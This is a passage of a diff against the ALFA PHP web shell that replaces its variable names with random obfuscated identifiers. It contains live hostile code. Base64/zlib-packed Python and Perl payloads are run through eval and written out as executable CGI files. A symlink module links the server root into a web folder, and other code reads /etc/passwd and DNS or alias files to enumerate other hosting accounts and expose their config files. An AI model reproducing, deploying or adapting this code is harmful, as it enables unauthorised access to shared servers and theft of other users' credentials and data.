kzoeaW7RV48ONSQ9LXaQdHw8RImVRBDvyuJRdbqr25WnL6e0bva0Uq+JXcLVyzNi84qp2j1hMHfYC4QoIVrU1gg1lXU91EUDviiIrRLnSolXlFos2rAaArumbZcEMcXQzKrJpSpp6BlAjhh4f2h7CU57Jiqznm/9Zt188KGVbK+VbGUTsaeCySn6FHvRL0O0Frixu8NJ6iUkLal1jIe0/zCB+orEMMkCkyBIesVcRtN5cB6ecUcSh3uPaJOmTcpR8UK90xkFQSMLdn2jiOi+OfsD8hwwLVraBVm5QMvC1J606R1ugMdchoeuOqkALJR9gkYJr7owlije6vUXll1oFqyM7GqjcOhU1pZaMwnuDiehVYaCGGQEiw10YAxpPPp/GxLJgFueWPLOv9q5trZIirNaqa9DN4NIWc4vUNdDk4Ieq6VAZQmz9a2XiN5Kp2CvL/NNnL2/hryHsU8f3Jb6gsx0wrDGqW1BnXmktetW6Rh2073mlfTRuNVyodndQm8TWahaDdilVIiWn/Wvo1MKKB0K60pl4qzNFjFSiWBsqr3RE6LlM4IvAkFhEDJT39FBe9srGsieLUz3ooeRByEd3Ir5VC3Bci2+irRI9FszCOS0VzJZCbfha4L5z22/WgtirYGdRBQxy3IeWwC0Alg1nkEAx7yJ4j/hYWs9GTTVbVCMHYMAcw3ghz3eRB76okG1hnOr4walUsLxzWH2gKR2JHdCjShA5/1qNhThSbQnLNwF3L16+DLSd/SCfsrFVowF6iK6rC8MeOGVDqoqnLQR16jwmGgTkduH8cAuxB0IBNnAoG4irCiT8ik4ihsL15Ab6q1WfQUFI72B/X493voyXZ+pmCPe+C3EzvJA3ww/lzbCfnufi+svgE6ELytBZliTZHOr1RyDI+ulbOXxkxVICyOulxnVyuPT00xNCLuFSru7keQLtA+XjXPztIQGRIHghdVkH2L9wSmDQ/w1wHelDNU/CArzRAxXvTN3OmOMoooyVV3II3+Faaq8nBUFBQ6tr1ONTuwzSnepOuG2ygrRXk7hVNhRdTMuv5bAmU6S8rlZe1E6U/7EAH/4H5eHKfSsRAAA=")));';
+	$jbyuabyldfed5bc177b87ab317c584e06566adc6 = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
+	$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289 = "symperl.alfa";
+	$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $pxmkwegbf83a0aa1f9ca0f7dd5994445ba7d9e80;
+	$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = "perl";
 	if($_POST["alfa2"]=="sympy"){
-		$cginame = "pysymlink.alfa";
-		$source = $py;
-		$lang = "python";
+		$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289 = "pysymlink.alfa";
+		$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb = $jbyuabyldfed5bc177b87ab317c584e06566adc6;
+		$phbpyamz7572559ca86e781ba8fe8073a0b725c6 = "python";
 	}
-	@__write_file($cginame,$source);
-	@chmod($cginame,0755);
+	@__write_file($jjbnlocq1214201a50a713fdbd2a6fe7a31c4289,$kqwumwsm36cd38f49b9afa08222c0dc9ebfe35eb);
+	@chmod($jjbnlocq1214201a50a713fdbd2a6fe7a31c4289,0755);
 	echo __pre();
-	$resource = alfaEx("{$lang} {$cginame} {$sympath}",false,true,true);
-	if(strlen($resource) == 0){
-		echo AlfaiFrameCreator('cgialfa/'.$cginame);
+	$ovsedldc96ab4e163f4ee03aaa4d1051aa51d204 = alfaEx("{$phbpyamz7572559ca86e781ba8fe8073a0b725c6} {$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289} {$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c}",false,true,true);
+	if(strlen($ovsedldc96ab4e163f4ee03aaa4d1051aa51d204) == 0){
+		echo AlfaiFrameCreator('cgialfa/'.$jjbnlocq1214201a50a713fdbd2a6fe7a31c4289);
 	}else{
-		echo $resource;
+		echo $ovsedldc96ab4e163f4ee03aaa4d1051aa51d204;
 	}
 }
 if(isset($_POST['alfa4']) && $_POST['alfa4']=='SymFile'){
@@ -4324,228 +4397,228 @@ echo __pre().'
 <input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
 <input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/>
 <p><input type="submit" value=" " name="symlink" /></p></form></center>';
-$path = $_POST['alfa5'];
-$symname = $_POST['alfa6'];
-$solevisible58 = $_POST['alfa7'];
-if($solevisible58){
-$new_name = str_replace(".", "_", basename($symname));
-$rand_dir = $new_name.rand(111,9999);
-$sym_dir = 'alfasymlinkphp/'.$rand_dir.'/';
-@mkdir($sym_dir, 0777, true);
-alfacgihtaccess('sym', $sym_dir, $symname);
-_alfa_symlink("$path","$sym_dir/$symname");
+$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485 = $_POST['alfa5'];
+$wotiivfs4930ff3daf8e31b1f189819fcad77e1e = $_POST['alfa6'];
+$czgojdoh04bf8675bbdf13662b5ca41d294a517e = $_POST['alfa7'];
+if($czgojdoh04bf8675bbdf13662b5ca41d294a517e){
+$amrueank10b04069381b2fef4e0a41e0ea65b914 = str_replace(".", "_", basename($wotiivfs4930ff3daf8e31b1f189819fcad77e1e));
+$olgpvucu1fa36c7a1aa1062b9227fc5572e5805c = $amrueank10b04069381b2fef4e0a41e0ea65b914.rand(111,9999);
+$qulngrvpd80b0ef93e3b626c7614d24dbd523391 = 'alfasymlinkphp/'.$olgpvucu1fa36c7a1aa1062b9227fc5572e5805c.'/';
+@mkdir($qulngrvpd80b0ef93e3b626c7614d24dbd523391, 0777, true);
+alfacgihtaccess('sym', $qulngrvpd80b0ef93e3b626c7614d24dbd523391, $wotiivfs4930ff3daf8e31b1f189819fcad77e1e);
+_alfa_symlink("$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485","$qulngrvpd80b0ef93e3b626c7614d24dbd523391/$wotiivfs4930ff3daf8e31b1f189819fcad77e1e");
 echo __pre();
-echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
+echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__ALFA_DATA_FOLDER__."/".$qulngrvpd80b0ef93e3b626c7614d24dbd523391.'" ><b><font size="4">'.$wotiivfs4930ff3daf8e31b1f189819fcad77e1e.'</font></b></a></b></center>';
 }
 }else{echo "<center><pre class=ml1 style='margin-top:5px'><b><font color=\"#FFFFFF\">[+] Symlink Function Disabled !</b></font></pre></center>";}
 }
 if(isset($_POST['alfa2']) && $_POST['alfa2']=='symphp'){
-$cant_symlink = true;
+$emqpgypucfee63abb9f61af226a0ed410bd27503 = true;
 if(function_exists('symlink')||_alfa_can_runCommand(false,false)){
 @mkdir('alfasymlink',0777);
 alfacgihtaccess('sym','alfasymlink/');
 _alfa_symlink('/','alfasymlink/root');
-$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
+$rpvpiklte4438a34c96dc317518305ff33446590 = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FF0000;'><b>symlink</span></b></td>";
 if(_alfa_file_exists("/etc/named.conf") && !_alfa_file_exists("/etc/virtual/domainowners") && _alfa_file_exists("/etc/valiases/")){
 echo "<center>";
-$lines = array();
-$anony_domains = array();
-$anonymous_users = array();
-$f_black = array();
-$error = false;
-$anonymous = false;
-$makepwd = "/home/{user}/public_html/";
-$domains = alfaGetDomains();
-$lines = $domains["lines"];
-$state = $domains["state"];
-$is_posix = function_exists("posix_getpwuid") && function_exists("fileowner");
-$can_runcmd = _alfa_can_runCommand(false,false);
-if(!$is_posix && !$can_runcmd){
-	$anonymous = true;
-	$anony_domains = $domains["lines"];
-	$lines = _alfa_file('/etc/passwd');
+$rotcxius980da98409d058c365664ff7ea33dd6b = array();
+$imsdmvbtfc6c17b164f4d1425e0c3bb04018fe8d = array();
+$htexpnqme9e5ad0c05ee1a43715572e5cc545926 = array();
+$mzowvciqce183dd09e479cb46598fab58042c279 = array();
+$kowlomtecb5e100e5a9a3e7f6d1fd97512215282 = false;
+$sradkvjl294de3557d9d00b3d2d8a1e6aab028cf = false;
+$nddlimoycaf1642d28814084eb82983b9c9c88d6 = "/home/{user}/public_html/";
+$jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3 = alfaGetDomains();
+$rotcxius980da98409d058c365664ff7ea33dd6b = $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3["lines"];
+$vrvwwpml9ed39e2ea931586b6a985a6942ef573e = $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3["state"];
+$xjaxgmnv83de6dd031ba173f21967a931037ec60 = function_exists("posix_getpwuid") && function_exists("fileowner");
+$gaywbmmzb5f0f86473671922c8ca300c9b3964da = _alfa_can_runCommand(false,false);
+if(!$xjaxgmnv83de6dd031ba173f21967a931037ec60 && !$gaywbmmzb5f0f86473671922c8ca300c9b3964da){
+	$sradkvjl294de3557d9d00b3d2d8a1e6aab028cf = true;
+	$imsdmvbtfc6c17b164f4d1425e0c3bb04018fe8d = $jwhtlluxe4e46deb7f9cc58c7abfb32e5570b6f3["lines"];
+	$rotcxius980da98409d058c365664ff7ea33dd6b = _alfa_file('/etc/passwd');
 }
-echo $table_header;
-$count=1;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
-foreach($lines as $line){
-	$domain = "";
-	$owner = "";
-	if($anonymous){
-		$explode = explode(":", $line);
-		$owner = $explode[0];
-		$owner_len = strlen($owner) - 1;
-		$userid = $explode[2];
-		if((int)$userid < 500)continue;
-		$domain = "[?????]";
-		$temp_black = array();
-		$finded = false;
-		foreach($anony_domains as $anony){
-			if($state == "named.conf"){
-				if(@strstr($anony, 'zone')){
-					preg_match_all('#zone "(.*)"#',$anony, $data);
-					$domain = $data[1][0];
+echo $rpvpiklte4438a34c96dc317518305ff33446590;
+$gstvxiofe2942a04780e223b215eb8b663cf5353=1;
+$gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6 = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
+foreach($rotcxius980da98409d058c365664ff7ea33dd6b as $yeshcnjz6438c669e0d0de98e6929c2cc0fac474){
+	$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = "";
+	$uexvflme72122ce96bfec66e2396d2e25225d70a = "";
+	if($sradkvjl294de3557d9d00b3d2d8a1e6aab028cf){
+		$dtjwbadif821b5159d85278da0badf5d32ffe210 = explode(":", $yeshcnjz6438c669e0d0de98e6929c2cc0fac474);
+		$uexvflme72122ce96bfec66e2396d2e25225d70a = $dtjwbadif821b5159d85278da0badf5d32ffe210[0];
+		$gfnlupyv7a10ffd76b8af11650c361f68024e752 = strlen($uexvflme72122ce96bfec66e2396d2e25225d70a) - 1;
+		$xxfwtkpaea8f538c94b6e352418254ed6474a81f = $dtjwbadif821b5159d85278da0badf5d32ffe210[2];
+		if((int)$xxfwtkpaea8f538c94b6e352418254ed6474a81f < 500)continue;
+		$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = "[?????]";
+		$bcnkdzpbe94abcdda4c989fc226508beffab1371 = array();
+		$eqsewqrq9005b92f4d155f8736f7e3647f552ca9 = false;
+		foreach($imsdmvbtfc6c17b164f4d1425e0c3bb04018fe8d as $gissihyx9163834aac262db4408928dd21608752){
+			if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named.conf"){
+				if(@strstr($gissihyx9163834aac262db4408928dd21608752, 'zone')){
+					preg_match_all('#zone "(.*)"#',$gissihyx9163834aac262db4408928dd21608752, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
+					$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $sfmsaibm8d777f385d3dfec8815d20f7496026dc[1][0];
 				}else{
 					continue;
 				}
-			}elseif($state == "named" || $state == "valiases"){
-				if($anony == "." || $anony == "..")continue;
-				if($state == "named")$anony = rtrim($anony, ".db");
-				$domain = $anony;
+			}elseif($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named" || $vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "valiases"){
+				if($gissihyx9163834aac262db4408928dd21608752 == "." || $gissihyx9163834aac262db4408928dd21608752 == "..")continue;
+				if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named")$gissihyx9163834aac262db4408928dd21608752 = rtrim($gissihyx9163834aac262db4408928dd21608752, ".db");
+				$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $gissihyx9163834aac262db4408928dd21608752;
 			}
-			$sub_domain = str_replace(array("-","."), "", $domain);
-			if(substr($owner, 0, $owner_len) == substr($sub_domain, 0, $owner_len)){
-				if(in_array($owner.$domain, $temp_black))continue;
-				$sympath = str_replace("{user}", $owner, $makepwd);
-				$http = "http://".$domain;
-				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
-				$count++;
-				$temp_black[] = $owner.$domain;
-				$finded = true;
+			$awzpxgwq7564419312cfbd932f4bd36412e8d6aa = str_replace(array("-","."), "", $qbjarsosad5f82e879a9c5d6b5b442eb37e50551);
+			if(substr($uexvflme72122ce96bfec66e2396d2e25225d70a, 0, $gfnlupyv7a10ffd76b8af11650c361f68024e752) == substr($awzpxgwq7564419312cfbd932f4bd36412e8d6aa, 0, $gfnlupyv7a10ffd76b8af11650c361f68024e752)){
+				if(in_array($uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $bcnkdzpbe94abcdda4c989fc226508beffab1371))continue;
+				$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = str_replace("{user}", $uexvflme72122ce96bfec66e2396d2e25225d70a, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+				$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "http://".$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
+				echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8, $qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $uexvflme72122ce96bfec66e2396d2e25225d70a, $kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
+				$gstvxiofe2942a04780e223b215eb8b663cf5353++;
+				$bcnkdzpbe94abcdda4c989fc226508beffab1371[] = $uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
+				$eqsewqrq9005b92f4d155f8736f7e3647f552ca9 = true;
 			}
 		}
-		if(!$finded){$anonymous_users[] = $owner;
+		if(!$eqsewqrq9005b92f4d155f8736f7e3647f552ca9){$htexpnqme9e5ad0c05ee1a43715572e5cc545926[] = $uexvflme72122ce96bfec66e2396d2e25225d70a;
 		}
 	}else{
- 		if($state == "named.conf"){
-			if(@strstr($line, 'zone')){
-				preg_match_all('#zone "(.*)"#',$line, $data);
-				$domain = $data[1][0];
+ 		if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named.conf"){
+			if(@strstr($yeshcnjz6438c669e0d0de98e6929c2cc0fac474, 'zone')){
+				preg_match_all('#zone "(.*)"#',$yeshcnjz6438c669e0d0de98e6929c2cc0fac474, $sfmsaibm8d777f385d3dfec8815d20f7496026dc);
+				$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $sfmsaibm8d777f385d3dfec8815d20f7496026dc[1][0];
 			}else{
 				continue;
 			}
-		}elseif($state == "named" || $state == "valiases"){
-			if($line == "." || $line == "..")continue;
-			if($state == "named")$line = rtrim($line, ".db");
-			$domain = $line;
+		}elseif($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named" || $vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "valiases"){
+			if($yeshcnjz6438c669e0d0de98e6929c2cc0fac474 == "." || $yeshcnjz6438c669e0d0de98e6929c2cc0fac474 == "..")continue;
+			if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "named")$yeshcnjz6438c669e0d0de98e6929c2cc0fac474 = rtrim($yeshcnjz6438c669e0d0de98e6929c2cc0fac474, ".db");
+			$qbjarsosad5f82e879a9c5d6b5b442eb37e50551 = $yeshcnjz6438c669e0d0de98e6929c2cc0fac474;
 		}
-		if(strlen(trim($domain)) > 2 && $state != "passwd"){
-			if(!_alfa_file_exists('/etc/valiases/'.$domain, false))continue;
-			if($is_posix){
-				$user = @posix_getpwuid(@fileowner('/etc/valiases/'.$domain));
-				$owner = $user["name"];
-			}elseif($can_runcmd){
-				$owner = alfaEx("stat -c '%U' /etc/valiases/".$domain,false,false);
+		if(strlen(trim($qbjarsosad5f82e879a9c5d6b5b442eb37e50551)) > 2 && $vrvwwpml9ed39e2ea931586b6a985a6942ef573e != "passwd"){
+			if(!_alfa_file_exists('/etc/valiases/'.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551, false))continue;
+			if($xjaxgmnv83de6dd031ba173f21967a931037ec60){
+				$eeodyzriee11cbb19052e40b07aac0ca060c23ee = @posix_getpwuid(@fileowner('/etc/valiases/'.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551));
+				$uexvflme72122ce96bfec66e2396d2e25225d70a = $eeodyzriee11cbb19052e40b07aac0ca060c23ee["name"];
+			}elseif($gaywbmmzb5f0f86473671922c8ca300c9b3964da){
+				$uexvflme72122ce96bfec66e2396d2e25225d70a = alfaEx("stat -c '%U' /etc/valiases/".$qbjarsosad5f82e879a9c5d6b5b442eb37e50551,false,false);
 			}
 		}
 	}
-	if(!$anonymous){
-		if(strlen($owner)==0 || in_array($owner.$domain, $f_black))continue;
-		$sympath = str_replace("{user}", $owner, $makepwd);
-		$http = "http://".$domain;
-		if($state == "passwd"){
-			$http = "javascript:alert('we cant find domain...')";
+	if(!$sradkvjl294de3557d9d00b3d2d8a1e6aab028cf){
+		if(strlen($uexvflme72122ce96bfec66e2396d2e25225d70a)==0 || in_array($uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $mzowvciqce183dd09e479cb46598fab58042c279))continue;
+		$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = str_replace("{user}", $uexvflme72122ce96bfec66e2396d2e25225d70a, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "http://".$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
+		if($vrvwwpml9ed39e2ea931586b6a985a6942ef573e == "passwd"){
+			$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "javascript:alert('we cant find domain...')";
 		}
-		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, $domain, $owner, $sympath), $template);
-		$count++;
-		$f_black[] = $owner.$domain;
+		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8, $qbjarsosad5f82e879a9c5d6b5b442eb37e50551, $uexvflme72122ce96bfec66e2396d2e25225d70a, $kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
+		$gstvxiofe2942a04780e223b215eb8b663cf5353++;
+		$mzowvciqce183dd09e479cb46598fab58042c279[] = $uexvflme72122ce96bfec66e2396d2e25225d70a.$qbjarsosad5f82e879a9c5d6b5b442eb37e50551;
 	}
 }
-if($anonymous){
-	foreach($anonymous_users as $owner){
-		$sympath = str_replace("{user}", $owner, $makepwd);
-		$http = "javascript:alert('we cant find domain...')";
-		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($count, $http, "[????]", $owner, $sympath), $template);
-		$count++;
+if($sradkvjl294de3557d9d00b3d2d8a1e6aab028cf){
+	foreach($htexpnqme9e5ad0c05ee1a43715572e5cc545926 as $uexvflme72122ce96bfec66e2396d2e25225d70a){
+		$kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c = str_replace("{user}", $uexvflme72122ce96bfec66e2396d2e25225d70a, $nddlimoycaf1642d28814084eb82983b9c9c88d6);
+		$pvoljqdc80791b3ae7002cb88c246876d9faa8f8 = "javascript:alert('we cant find domain...')";
+		echo str_replace(array("{count}", "{http}", "{domain}", "{owner}", "{sympath}"), array($gstvxiofe2942a04780e223b215eb8b663cf5353, $pvoljqdc80791b3ae7002cb88c246876d9faa8f8, "[????]", $uexvflme72122ce96bfec66e2396d2e25225d70a, $kfotlzxs0ceeb9cdc26a4500ef1d94e6f3057d1c), $gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6);
+		$gstvxiofe2942a04780e223b215eb8b663cf5353++;
 	}
 }
-$cant_symlink = false;
+$emqpgypucfee63abb9f61af226a0ed410bd27503 = false;
 }else{
-$is_direct = false;
-$makepwd = alfaMakePwd();
+$ksmhyxred6ebdd1917aa6fd3aa4228decf56e704 = false;
+$nddlimoycaf1642d28814084eb82983b9c9c88d6 = alfaMakePwd();
 if(_alfa_file_exists("/etc/virtual/domainowners")){
-	$makepwd = "/home/{user}/public_html";
-	$is_direct = true;
+	$nddlimoycaf1642d28814084eb82983b9c9c88d6 = "/home/{user}/public_html";
+	$ksmhyxred6ebdd1917aa6fd3aa4228decf56e704 = true;
 }
-$sole = _alfa_file("/etc/virtual/domainowners");
-$count=1;
-echo $table_header;
-$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
-if($sole){
-	foreach($sole as $visible){
-		if(@strstr($visible,":")){
-			$solevisible = explode(':', $visible);
-			$cwd = str_replace("{user}", trim($solevisible[1]), $makepwd);
-			echo str_replace(array("{count}","{user}","{url}","{cwd}"), array($count++, trim($solevisible[1]), trim($solevisible[0]), $cwd), $template);
+$nuabiabibeb7f7a395dc21ad97425bbc061afbaf = _alfa_file("/etc/virtual/domainowners");
+$gstvxiofe2942a04780e223b215eb8b663cf5353=1;
+echo $rpvpiklte4438a34c96dc317518305ff33446590;
+$gpzvhhsw66f6181bcb4cff4cd38fbc804a036db6 = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__ALFA_DATA_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
+if($nuabiabibeb7f7a395dc21ad97425bbc061afbaf){
+	foreach($nuabiabibeb7f7a395dc21ad97425bbc061afbaf as $fvvocjkn46cf0e59759c9b7f1112ca4b174343ef){
+		if(@strstr($fvvocjkn46cf0e59759c9b7f1112ca4b174343ef,":")){
+			$syosrpmxd4a590caacc0be55ef286e40a945ea45 = explode(':', $fvvocjkn46cf0e59759c9b7f1112ca4b174343ef);
